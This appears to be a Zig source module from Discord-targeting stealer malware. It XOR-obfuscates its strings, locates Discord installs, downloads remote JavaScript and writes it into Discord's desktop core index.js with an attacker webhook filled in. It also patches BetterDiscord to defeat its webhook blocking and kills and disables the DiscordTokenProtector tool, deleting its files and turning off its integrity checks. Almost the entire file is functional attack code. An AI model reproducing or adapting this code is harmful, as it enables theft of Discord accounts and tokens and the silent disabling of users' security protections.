const std = @import("std");
const types = @import("../types/types.zig");
const engine = @import("../syscalls/engine.zig");
const hash = @import("../types/hash.zig");
const file_io = @import("../parsers/file_io.zig");

const FILE_GENERIC_WRITE: types.ULONG = 0x40000000;
const FILE_OVERWRITE_IF: types.ULONG = 0x00000005;
const FILE_OPEN: types.ULONG = 0x00000001;
const FILE_SHARE_READ: types.ULONG = 0x00000001;
const FILE_SYNCHRONOUS_IO_NONALERT: types.ULONG = 0x00000020;
const FILE_NON_DIRECTORY_FILE: types.ULONG = 0x00000040;
const DELETE_ACCESS: types.ULONG = 0x00010000;

const PROCESS_TERMINATE: u32 = 0x0001;

extern "kernel32" fn OpenProcess(dwDesiredAccess: u32, bInheritHandle: i32, dwProcessId: u32) callconv(std.os.windows.WINAPI) types.HANDLE;
extern "kernel32" fn TerminateProcess(hProcess: types.HANDLE, uExitCode: u32) callconv(std.os.windows.WINAPI) i32;

const E = struct {
    pub const discord_dir = hash.xorEncrypt("discord");
    pub const discord_canary = hash.xorEncrypt("discordcanary");
    pub const discord_ptb = hash.xorEncrypt("discordptb");
    pub const discord_development = hash.xorEncrypt("discorddevelopment");
    pub const modules = hash.xorEncrypt("modules");
    pub const discord_desktop_core = hash.xorEncrypt("discord_desktop_core");
    pub const index_js = hash.xorEncrypt("index.js");
    pub const initiation = hash.xorEncrypt("initiation");
    pub const core_asar = hash.xorEncrypt("core.asar");
    pub const webhook_token = hash.xorEncrypt("%WEBHOOK%");
    pub const better_discord = hash.xorEncrypt("BetterDiscord");
    pub const data = hash.xorEncrypt("data");
    pub const betterdiscord_asar = hash.xorEncrypt("betterdiscord.asar");
    pub const api_webhooks = hash.xorEncrypt("api/webhooks");
    pub const by_hackirby = hash.xorEncrypt("ByHackirby");
    pub const discord_token_protector = hash.xorEncrypt("DiscordTokenProtector");
    pub const config_json = hash.xorEncrypt("config.json");
    pub const protector_exe = hash.xorEncrypt("DiscordTokenProtector.exe");
    pub const protection_dll = hash.xorEncrypt("ProtectionPayload.dll");
    pub const secure_dat = hash.xorEncrypt("secure.dat");
    pub const app_prefix = hash.xorEncrypt("app-");
    pub const core_prefix = hash.xorEncrypt("discord_desktop_core-");
};

pub const DiscordPaths = struct {
    discord: bool,
    discord_canary: bool,
    discord_ptb: bool,
    discord_development: bool,
};

fn pathExists(dir: []const u8) bool {
    var d = std.fs.openDirAbsolute(dir, .{}) catch return false;
    d.close();
    return true;
}

fn findDiscordCorePath(allocator: std.mem.Allocator, discord_dir: []const u8) ?[]const u8 {
    var dir = std.fs.openDirAbsolute(discord_dir, .{}) catch return null;
    defer dir.close();

    var core_path: ?[]const u8 = null;
    var iter = dir.iterate();
    while (iter.next() catch null) |entry| {
        if (entry.kind != .directory) continue;
        const name = entry.name;

        var prefix_decrypted: [E.app_prefix.len]u8 = undefined;
        hash.xorDecrypt(&E.app_prefix, &prefix_decrypted);
        if (!std.mem.startsWith(u8, name, &prefix_decrypted)) continue;

        const modules_path = try std.fs.path.join(allocator, &[_][]const u8{ discord_dir, name });
        defer allocator.free(modules_path);

        var modules_dir = std.fs.openDirAbsolute(modules_path, .{}) catch continue;
        defer modules_dir.close();

        var modules_iter = modules_dir.iterate();
        while (modules_iter.next() catch null) |mod_entry| {
            if (mod_entry.kind != .directory) continue;
            const mod_name = mod_entry.name;

            var core_prefix_decrypted: [E.core_prefix.len]u8 = undefined;
            hash.xorDecrypt(&E.core_prefix, &core_prefix_decrypted);
            if (!std.mem.startsWith(u8, mod_name, &core_prefix_decrypted)) continue;

            var core_name_decrypted: [E.discord_desktop_core.len]u8 = undefined;
            hash.xorDecrypt(&E.discord_desktop_core, &core_name_decrypted);

            const core_path_full = try std.fs.path.join(allocator, &[_][]const u8{ modules_path, mod_name, &core_name_decrypted });
            if (pathExists(core_path_full)) {
                if (core_path) |prev| allocator.free(prev);
                core_path = core_path_full;
            } else {
                allocator.free(core_path_full);
            }
        }
    }
    return core_path;
}

pub fn findDiscordPaths(local_app_data: []const u8) DiscordPaths {
    var decrypted: [E.discord_dir.len]u8 = undefined;
    var decrypted_canary: [E.discord_canary.len]u8 = undefined;
    var decrypted_ptb: [E.discord_ptb.len]u8 = undefined;
    var decrypted_dev: [E.discord_development.len]u8 = undefined;

    hash.xorDecrypt(&E.discord_dir, &decrypted);
    hash.xorDecrypt(&E.discord_canary, &decrypted_canary);
    hash.xorDecrypt(&E.discord_ptb, &decrypted_ptb);
    hash.xorDecrypt(&E.discord_development, &decrypted_dev);

    const discord_path = std.fs.path.join(std.heap.page_allocator, &[_][]const u8{ local_app_data, &decrypted }) catch return DiscordPaths{ .discord = false, .discord_canary = false, .discord_ptb = false, .discord_development = false };
    defer std.heap.page_allocator.free(discord_path);
    const canary_path = std.fs.path.join(std.heap.page_allocator, &[_][]const u8{ local_app_data, &decrypted_canary }) catch return DiscordPaths{ .discord = false, .discord_canary = false, .discord_ptb = false, .discord_development = false };
    defer std.heap.page_allocator.free(canary_path);
    const ptb_path = std.fs.path.join(std.heap.page_allocator, &[_][]const u8{ local_app_data, &decrypted_ptb }) catch return DiscordPaths{ .discord = false, .discord_canary = false, .discord_ptb = false, .discord_development = false };
    defer std.heap.page_allocator.free(ptb_path);
    const dev_path = std.fs.path.join(std.heap.page_allocator, &[_][]const u8{ local_app_data, &decrypted_dev }) catch return DiscordPaths{ .discord = false, .discord_canary = false, .discord_ptb = false, .discord_development = false };
    defer std.heap.page_allocator.free(dev_path);

    return DiscordPaths{
        .discord = pathExists(discord_path),
        .discord_canary = pathExists(canary_path),
        .discord_ptb = pathExists(ptb_path),
        .discord_development = pathExists(dev_path),
    };
}

fn writeFileNT(path: []const u8, data: []const u8) bool {
    var buf: [512]u16 = undefined;
    for (path, 0..) |c, i| {
        if (i >= buf.len) return false;
        buf[i] = c;
    }

    var name_us = types.UNICODE_STRING{
        .Length = @as(types.USHORT, @intCast(path.len * 2)),
        .MaximumLength = @as(types.USHORT, @intCast(buf.len * 2)),
        .Buffer = @as(types.PWSTR, @ptrCast(&buf)),
    };

    var attr = types.OBJECT_ATTRIBUTES{
        .Length = @sizeOf(types.OBJECT_ATTRIBUTES),
        .RootDirectory = null,
        .ObjectName = &name_us,
        .Attributes = types.OBJ_CASE_INSENSITIVE,
        .SecurityDescriptor = null,
        .SecurityQualityOfService = null,
    };

    var file_handle: types.HANDLE = undefined;
    var iosb: types.IO_STATUS_BLOCK = undefined;
    const alloc_size: types.LARGE_INTEGER = @intCast(data.len);

    const c_status = engine.NtCreateFile(
        &file_handle,
        FILE_GENERIC_WRITE,
        @as(types.PVOID, @ptrCast(&attr)),
        @as(types.PVOID, @ptrCast(&iosb)),
        @as(*const anyopaque, @ptrCast(&alloc_size)),
        0,
        FILE_SHARE_READ,
        FILE_OVERWRITE_IF,
        FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
        null,
        0,
    );
    if (c_status < 0) return false;
    defer _ = engine.NtClose(file_handle);

    const w_status = engine.NtWriteFile(
        file_handle,
        @as(types.HANDLE, @ptrFromInt(@as(usize, 0))),
        null,
        null,
        @as(types.PVOID, @ptrCast(&iosb)),
        @as(types.PVOID, @ptrCast(@constCast(data.ptr))),
        @as(types.ULONG, @intCast(data.len)),
        null,
        null,
    );
    return w_status >= 0;
}

pub fn injectDiscord(local_app_data: []const u8, injection_url: []const u8, webhook: []const u8) bool {
    const core_path = findDiscordCorePath(std.heap.page_allocator, local_app_data) orelse return false;
    defer std.heap.page_allocator.free(core_path);

    var initiation_decrypted: [E.initiation.len]u8 = undefined;
    hash.xorDecrypt(&E.initiation, &initiation_decrypted);

    const initiation_path = std.fs.path.join(std.heap.page_allocator, &[_][]const u8{ core_path, &initiation_decrypted }) catch return false;
    defer std.heap.page_allocator.free(initiation_path);
    _ = std.fs.makeDirAbsolute(initiation_path) catch {};

    const uri = std.Uri.parse(injection_url) catch return false;
    const host = uri.host orelse return false;
    const port = uri.port orelse 443;

    const http_client = @import("../network/http.zig");
    var client = http_client.HttpClient.connect(host, port) catch return false;
    defer client.socket.deinit();

    const path = uri.path orelse "/";
    var response = client.get(path, &.{}) catch return false;
    defer response.deinit();

    var core_asar_decrypted: [E.core_asar.len]u8 = undefined;
    hash.xorDecrypt(&E.core_asar, &core_asar_decrypted);

    if (std.mem.indexOf(u8, response.body, &core_asar_decrypted) == null) return false;

    var webhook_token_decrypted: [E.webhook_token.len]u8 = undefined;
    hash.xorDecrypt(&E.webhook_token, &webhook_token_decrypted);

    var index_js_decrypted: [E.index_js.len]u8 = undefined;
    hash.xorDecrypt(&E.index_js, &index_js_decrypted);

    const modified = std.mem.replaceOwned(u8, std.heap.page_allocator, response.body, &webhook_token_decrypted, webhook) catch return false;
    defer std.heap.page_allocator.free(modified);

    const index_path = std.fs.path.join(std.heap.page_allocator, &[_][]const u8{ core_path, &index_js_decrypted }) catch return false;
    defer std.heap.page_allocator.free(index_path);

    return writeFileNT(index_path, modified);
}

fn deleteFileNT(path: []const u8) bool {
    var buf: [512]u16 = undefined;
    for (path, 0..) |c, i| {
        if (i >= buf.len) return false;
        buf[i] = c;
    }

    var name_us = types.UNICODE_STRING{
        .Length = @as(types.USHORT, @intCast(path.len * 2)),
        .MaximumLength = @as(types.USHORT, @intCast(buf.len * 2)),
        .Buffer = @as(types.PWSTR, @ptrCast(&buf)),
    };

    var attr = types.OBJECT_ATTRIBUTES{
        .Length = @sizeOf(types.OBJECT_ATTRIBUTES),
        .RootDirectory = null,
        .ObjectName = &name_us,
        .Attributes = types.OBJ_CASE_INSENSITIVE,
        .SecurityDescriptor = null,
        .SecurityQualityOfService = null,
    };

    var file_handle: types.HANDLE = undefined;
    var iosb: types.IO_STATUS_BLOCK = undefined;

    const c_status = engine.NtCreateFile(
        &file_handle,
        DELETE_ACCESS,
        @as(types.PVOID, @ptrCast(&attr)),
        @as(types.PVOID, @ptrCast(&iosb)),
        null,
        0,
        FILE_SHARE_READ,
        FILE_OPEN,
        FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
        null,
        0,
    );
    if (c_status < 0) return false;

    var d_info = types.FILE_DISPOSITION_INFORMATION{ .DeleteFile = 1 };
    const d_status = engine.NtSetInformationFile(
        file_handle,
        @as(types.PVOID, @ptrCast(&iosb)),
        @as(types.PVOID, @ptrCast(&d_info)),
        @sizeOf(types.FILE_DISPOSITION_INFORMATION),
        @intFromEnum(types.FILE_INFORMATION_CLASS.FileDispositionInformation),
    );
    _ = engine.NtClose(file_handle);
    return d_status >= 0;
}

pub fn bypassBetterDiscord(roaming: []const u8) bool {
    var better_discord_decrypted: [E.better_discord.len]u8 = undefined;
    var data_decrypted: [E.data.len]u8 = undefined;
    var asar_decrypted: [E.betterdiscord_asar.len]u8 = undefined;
    var api_webhooks_decrypted: [E.api_webhooks.len]u8 = undefined;
    var by_hackirby_decrypted: [E.by_hackirby.len]u8 = undefined;

    hash.xorDecrypt(&E.better_discord, &better_discord_decrypted);
    hash.xorDecrypt(&E.data, &data_decrypted);
    hash.xorDecrypt(&E.betterdiscord_asar, &asar_decrypted);
    hash.xorDecrypt(&E.api_webhooks, &api_webhooks_decrypted);
    hash.xorDecrypt(&E.by_hackirby, &by_hackirby_decrypted);

    // betterdiscord.asar uses CP437 encoding, but both "api/webhooks" and
    // "ByHackirby" are pure ASCII so byte-level replacement is safe here.
    // For non-ASCII replacements, use cp437ToUtf8/utf8ToCp437 helpers.

    const bd_path = std.fs.path.join(std.heap.page_allocator, &[_][]const u8{ roaming, &better_discord_decrypted, &data_decrypted, &asar_decrypted }) catch return false;
    defer std.heap.page_allocator.free(bd_path);

    const mapped = file_io.MappedFile.open(bd_path) orelse return false;
    defer mapped.close();

    const content = mapped.slice();
    if (content.len == 0) return false;

    const modified = std.mem.replaceOwned(u8, std.heap.page_allocator, content, &api_webhooks_decrypted, &by_hackirby_decrypted) catch return false;
    defer std.heap.page_allocator.free(modified);

    if (std.mem.eql(u8, content, modified)) return false;

    return writeFileNT(bd_path, modified);
}

pub fn bypassTokenProtector(roaming: []const u8) bool {
    var tp_decrypted: [E.discord_token_protector.len]u8 = undefined;
    hash.xorDecrypt(&E.discord_token_protector, &tp_decrypted);

    const tp_path = std.fs.path.join(std.heap.page_allocator, &[_][]const u8{ roaming, &tp_decrypted }) catch return false;
    defer std.heap.page_allocator.free(tp_path);

    const processes_module = @import("../system/processes.zig");
    const procs = processes_module.collect(std.heap.page_allocator) catch return false;
    defer {
        for (procs) |p| std.heap.page_allocator.free(p.name);
        std.heap.page_allocator.free(procs);
    }

    var tp_lower_buf: [128]u8 = undefined;
    var tp_lower_len: usize = 0;
    for (tp_decrypted, 0..) |c, i| {
        if (i >= tp_lower_buf.len) break;
        tp_lower_buf[i] = if (c >= 'A' and c <= 'Z') c + 32 else c;
        tp_lower_len = i + 1;
    }
    const tp_lower = tp_lower_buf[0..tp_lower_len];

    for (procs) |proc| {
        const name_lower = std.ascii.lowerString(std.heap.page_allocator, proc.name) catch continue;
        defer std.heap.page_allocator.free(name_lower);

        if (std.mem.indexOf(u8, name_lower, tp_lower) != null) {
            const proc_handle = OpenProcess(PROCESS_TERMINATE, 0, proc.pid);
            if (@intFromPtr(proc_handle) != 0) {
                _ = TerminateProcess(proc_handle, 0);
                _ = engine.NtClose(proc_handle);
            }
        }
    }

    var protector_exe_decrypted: [E.protector_exe.len]u8 = undefined;
    var protection_dll_decrypted: [E.protection_dll.len]u8 = undefined;
    var secure_dat_decrypted: [E.secure_dat.len]u8 = undefined;

    hash.xorDecrypt(&E.protector_exe, &protector_exe_decrypted);
    hash.xorDecrypt(&E.protection_dll, &protection_dll_decrypted);
    hash.xorDecrypt(&E.secure_dat, &secure_dat_decrypted);

    const files_to_delete = [_][]const u8{
        &protector_exe_decrypted,
        &protection_dll_decrypted,
        &secure_dat_decrypted,
    };

    for (files_to_delete) |f| {
        const full = std.fs.path.join(std.heap.page_allocator, &[_][]const u8{ tp_path, f }) catch continue;
        defer std.heap.page_allocator.free(full);
        _ = std.fs.deleteFileAbsolute(full) catch {};
    }

    var config_json_decrypted: [E.config_json.len]u8 = undefined;
    hash.xorDecrypt(&E.config_json, &config_json_decrypted);

    const config_path = std.fs.path.join(std.heap.page_allocator, &[_][]const u8{ tp_path, &config_json_decrypted }) catch return false;
    defer std.heap.page_allocator.free(config_path);

    var config_dir = std.fs.openDirAbsolute(tp_path, .{}) catch return false;
    defer config_dir.close();

    var config_file = config_dir.openFile(&config_json_decrypted, .{}) catch return false;
    defer config_file.close();

    const file_size = config_file.getEndPos() catch return false;
    if (file_size == 0) return false;

    const raw = std.heap.page_allocator.alloc(u8, file_size) catch return false;
    defer std.heap.page_allocator.free(raw);

    const bytes_read = config_file.read(raw) catch return false;
    if (bytes_read == 0) return false;

    var parsed = std.json.parseFromSlice(std.json.Value, std.heap.page_allocator, raw[0..bytes_read], .{}) catch return false;
    defer parsed.deinit();

    const obj = parsed.value.object;
    obj.put("auto_start", std.json.Value{ .bool = false }) catch {};
    obj.put("auto_start_discord", std.json.Value{ .bool = false }) catch {};
    obj.put("integrity", std.json.Value{ .bool = false }) catch {};
    obj.put("integrity_allowbetterdiscord", std.json.Value{ .bool = false }) catch {};
    obj.put("integrity_checkexecutable", std.json.Value{ .bool = false }) catch {};
    obj.put("integrity_checkhash", std.json.Value{ .bool = false }) catch {};
    obj.put("integrity_checkmodule", std.json.Value{ .bool = false }) catch {};
    obj.put("integrity_checkscripts", std.json.Value{ .bool = false }) catch {};
    obj.put("integrity_checkresource", std.json.Value{ .bool = false }) catch {};
    obj.put("integrity_redownloadhashes", std.json.Value{ .bool = false }) catch {};
    obj.put("iterations_iv", std.json.Value{ .integer = 364 }) catch {};
    obj.put("iterations_key", std.json.Value{ .integer = 457 }) catch {};
    obj.put("version", std.json.Value{ .integer = 69420 }) catch {};

    var out_buf = std.ArrayList(u8).init(std.heap.page_allocator);
    defer out_buf.deinit();

    const writer = out_buf.writer();
    std.json.stringify(parsed.value, .{ .whitespace = .{ .indent = .{ .Space = 2 } } }, writer) catch return false;

    return writeFileNT(config_path, out_buf.items);
}

const cp437_to_unicode = [128]u16{
    0x00C7, 0x00FC, 0x00E9, 0x00E2, 0x00E4, 0x00E0, 0x00E5, 0x00E7,
    0x00EA, 0x00EB, 0x00E8, 0x00EF, 0x00EE, 0x00EC, 0x00C4, 0x00C5,
    0x00C9, 0x00E6, 0x00C6, 0x00F4, 0x00F6, 0x00F2, 0x00FB, 0x00F9,
    0x00FF, 0x00D6, 0x00DC, 0x00A2, 0x00A3, 0x00A5, 0x20A7, 0x0192,
    0x00E1, 0x00ED, 0x00F3, 0x00FA, 0x00F1, 0x00D1, 0x00AA, 0x00BA,
    0x00BF, 0x2310, 0x00AC, 0x00BD, 0x00BC, 0x00A1, 0x00AB, 0x00BB,
    0x2591, 0x2592, 0x2593, 0x2502, 0x2524, 0x2561, 0x2562, 0x2556,
    0x2555, 0x2563, 0x2551, 0x2557, 0x255D, 0x255C, 0x255B, 0x2510,
    0x2514, 0x2534, 0x252C, 0x251C, 0x2500, 0x253C, 0x255E, 0x255F,
    0x255A, 0x2554, 0x2569, 0x2566, 0x2560, 0x2550, 0x256C, 0x2567,
    0x2568, 0x2564, 0x2565, 0x2559, 0x2558, 0x2552, 0x2553, 0x256B,
    0x256A, 0x2518, 0x250C, 0x2588, 0x2584, 0x258C, 0x2590, 0x2580,
    0x03B1, 0x00DF, 0x0393, 0x03C0, 0x03A3, 0x03C3, 0x00B5, 0x03C4,
    0x03A6, 0x0398, 0x03A9, 0x03B4, 0x221E, 0x03C6, 0x03B5, 0x2229,
    0x2261, 0x00B1, 0x2265, 0x2264, 0x2320, 0x2321, 0x00F7, 0x2248,
    0x00B0, 0x2219, 0x00B7, 0x221A, 0x207F, 0x00B2, 0x25A0, 0x00A0,
};

fn findCp437Byte(cp: u21) ?u8 {
    if (cp < 128) return @as(u8, @intCast(cp));
    for (cp437_to_unicode, 0..) |entry, j| {
        if (entry == cp) return @as(u8, @intCast(j + 128));
    }
    return null;
}

fn cp437ToUtf8(bytes: []const u8, allocator: std.mem.Allocator) ![]u8 {
    var result = std.ArrayList(u8).init(allocator);
    errdefer result.deinit();

    for (bytes) |b| {
        if (b < 128) {
            try result.append(b);
        } else {
            const cp = cp437_to_unicode[b - 128];
            if (cp < 0x80) {
                try result.append(@as(u8, @intCast(cp)));
            } else if (cp < 0x800) {
                try result.append(@as(u8, @intCast(0xC0 | (cp >> 6))));
                try result.append(@as(u8, @intCast(0x80 | (cp & 0x3F))));
            } else {
                try result.append(@as(u8, @intCast(0xE0 | (cp >> 12))));
                try result.append(@as(u8, @intCast(0x80 | ((cp >> 6) & 0x3F))));
                try result.append(@as(u8, @intCast(0x80 | (cp & 0x3F))));
            }
        }
    }
    return result.toOwnedSlice();
}

fn utf8ToCp437(utf8: []const u8, allocator: std.mem.Allocator) ![]u8 {
    var result = std.ArrayList(u8).init(allocator);
    errdefer result.deinit();

    var i: usize = 0;
    while (i < utf8.len) {
        const b0 = utf8[i];
        if (b0 < 0x80) {
            try result.append(b0);
            i += 1;
        } else if (b0 < 0xC0) {
            return error.InvalidEncoding;
        } else if (b0 < 0xE0) {
            if (i + 1 >= utf8.len) return error.InvalidEncoding;
            const cp = (@as(u21, b0 & 0x1F) << 6) | (utf8[i + 1] & 0x3F);
            try result.append(findCp437Byte(cp) orelse return error.UnsupportedCharacter);
            i += 2;
        } else if (b0 < 0xF0) {
            if (i + 2 >= utf8.len) return error.InvalidEncoding;
            const cp = (@as(u21, b0 & 0x0F) << 12) | (@as(u21, utf8[i + 1] & 0x3F) << 6) | (utf8[i + 2] & 0x3F);
            try result.append(findCp437Byte(cp) orelse return error.UnsupportedCharacter);
            i += 3;
        } else {
            return error.InvalidEncoding;
        }
    }
    return result.toOwnedSlice();
}

const testing = std.testing;

test "findDiscordPaths all false for nonexistent" {
    const result = findDiscordPaths("C:\\__nonexistent__discord");
    try testing.expect(!result.discord);
    try testing.expect(!result.discord_canary);
    try testing.expect(!result.discord_ptb);
    try testing.expect(!result.discord_development);
}

test "injectDiscord returns false for nonexistent path" {
    const result = injectDiscord("C:\\__nonexistent__discord", "https://example.com/inject.js", "https://discord.com/api/webhooks/test");
    try testing.expect(!result);
}

test "bypassBetterDiscord returns false for nonexistent path" {
    const result = bypassBetterDiscord("C:\\__nonexistent__roaming");
    try testing.expect(!result);
}

test "bypassTokenProtector gracefully handles nonexistent" {
    const result = bypassTokenProtector("C:\\__nonexistent__roaming");
    try testing.expect(!result);
}

test "DiscordPaths defaults all false" {
    const dp = DiscordPaths{
        .discord = false,
        .discord_canary = false,
        .discord_ptb = false,
        .discord_development = false,
    };
    try testing.expect(!dp.discord);
    try testing.expect(!dp.discord_canary);
    try testing.expect(!dp.discord_ptb);
    try testing.expect(!dp.discord_development);
}
